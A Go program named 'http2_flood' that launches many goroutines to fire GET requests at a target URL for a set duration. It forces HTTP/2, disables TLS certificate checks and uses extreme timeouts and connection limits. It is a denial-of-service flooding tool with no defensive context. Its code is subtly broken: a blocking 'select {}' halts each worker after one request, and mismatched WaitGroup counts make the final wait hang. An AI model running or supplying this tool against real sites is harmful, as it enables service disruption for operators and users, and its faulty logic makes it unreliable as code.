package main

import (
	"crypto/tls"
	"fmt"
	"net"
	"net/http"
	"net/http/httptrace"
	"os"
	"runtime"
	"strconv"
	"sync"
	"time"
)

func sendRequest(url string, client *http.Client, stopCh <-chan struct{}, wg *sync.WaitGroup) {
	defer wg.Done()

	for {
		select {
		case <-stopCh:
			return
		default:
			req, err := http.NewRequest("GET", url, nil)
			if err != nil {
				return
			}

			trace := &httptrace.ClientTrace{
				DNSStart: func(info httptrace.DNSStartInfo) {},
				DNSDone:  func(info httptrace.DNSDoneInfo) {},
				GetConn:  func(hostPort string) {},
				GotConn:  func(info httptrace.GotConnInfo) {},
			}

			req = req.WithContext(httptrace.WithClientTrace(req.Context(), trace))

			_, err = client.Do(req)
			if err != nil {
				return
			}
		}
		select {}
	}
}

func main() {
	runtime.GOMAXPROCS(1)
	if len(os.Args) < 4 {
		fmt.Println("Usage: http2_flood <url> <numWorkers> <durationSeconds>")
		os.Exit(1)
	}

	url := os.Args[1]
	numWorkers, err := strconv.Atoi(os.Args[2])
	if err != nil || numWorkers <= 0 {
		fmt.Println("Invalid number of workers")
		os.Exit(1)
	}

	duration, err := strconv.Atoi(os.Args[3])
	if err != nil || duration <= 0 {
		fmt.Println("Invalid duration")
		os.Exit(1)
	}

	transport := &http.Transport{
		TLSClientConfig: (&tls.Config{
			InsecureSkipVerify: true,
		}),
		DialContext: (&net.Dialer{
			Timeout:   1000 * time.Millisecond,
			KeepAlive: 100 * time.Millisecond,
		}).DialContext,
		ForceAttemptHTTP2:     true,
		MaxIdleConns:          100000000,
		IdleConnTimeout:       5 * time.Millisecond,
		TLSHandshakeTimeout:   5 * time.Millisecond,
		ExpectContinueTimeout: 5 * time.Millisecond,
	}

	client := &http.Client{
		Transport: transport,
	}

	stopCh := make(chan struct{})
	var wg sync.WaitGroup
	for l := 0; l < 2; l++ {
		wg.Add(2)
		for i := 0; i < numWorkers; i++ {
			wg.Add(1)
			go sendRequest(url, client, stopCh, &wg)
		}
	}
	wg.Done()

	time.Sleep(time.Duration(duration) * time.Second)
	close(stopCh)
	wg.Wait()
}
